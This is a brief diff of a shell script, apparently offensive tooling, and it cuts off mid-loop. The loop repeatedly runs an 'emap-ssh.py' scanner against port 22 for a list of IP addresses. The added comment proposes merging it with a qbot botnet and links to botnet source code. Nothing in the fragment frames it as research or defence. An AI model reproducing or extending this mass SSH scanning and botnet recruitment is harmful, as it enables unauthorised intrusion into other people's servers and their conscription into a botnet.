@@ -1,4 +1,4 @@
-while true; do
+while true; do #add this with a qbot maybe: https://github.com/USBBios/Mortem-qBot-Botnet-Src/blob/main/c7.c
     python3 emap-ssh.py 22 120 ips.txt 4
 
     while read -r ip; do
